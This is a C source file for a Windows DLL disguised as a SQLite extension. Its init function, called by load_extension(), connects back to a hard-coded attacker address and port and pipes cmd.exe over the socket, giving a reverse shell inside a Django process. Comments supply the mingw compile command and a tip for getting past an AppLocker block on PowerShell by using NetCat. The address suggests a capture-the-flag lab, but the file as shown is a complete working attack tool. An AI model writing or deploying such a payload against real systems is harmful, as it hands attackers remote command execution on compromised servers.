/*
 * extrev.c  —  Winsock Reverse Shell DLL (SQLite extension)
 *
 * Exports sqlite3_extension_init — SQLite's load_extension() calls it by
 * name, giving us code execution inside the Django process.
 * Connects back, pipes cmd.exe stdio over the socket.
 *
 * Compile (mingw):
 *   x86_64-w64-mingw32-gcc -shared -o extrev.dll extrev.c -lws2_32
 *
 * Note: powershell.exe is blocked by AppLocker for this account.
 *       Swap EXEC_CMD to a NetCat path if you need a better shell.
 */

/* winsock2.h must come before windows.h */
#include <winsock2.h>
#include <windows.h>
#include <string.h>

#define ATTACKER_IP "10.10.16.56"
#define ATTACKER_PORT 9294
#define EXEC_CMD "cmd.exe"

__declspec(dllexport) int sqlite3_extension_init(
    void *db,
    char **pzErrMsg,
    void *pApi)
{
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in sa;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    /* Initialize Winsock before any socket calls */
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
        return 1;

    /* Plain TCP socket — no extra protocol provider */
    s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (s == INVALID_SOCKET)
    {
        WSACleanup();
        return 1;
    }

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(ATTACKER_IP);
    sa.sin_port = htons(ATTACKER_PORT); /* network byte order */

    if (connect(s, (struct sockaddr *)&sa, sizeof(sa)) == 0)
    {
        memset(&si, 0, sizeof(si));
        si.cb = sizeof(si);
        /* Point the child's stdio at the socket — shell over TCP */
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;

        char cmd[] = EXEC_CMD;

        if (CreateProcessA(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
        {
            /* Keep the extension call alive for the shell's lifetime */
            WaitForSingleObject(pi.hProcess, INFINITE);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }

    closesocket(s);
    WSACleanup();
    return 0; /* SQLITE_OK */
}
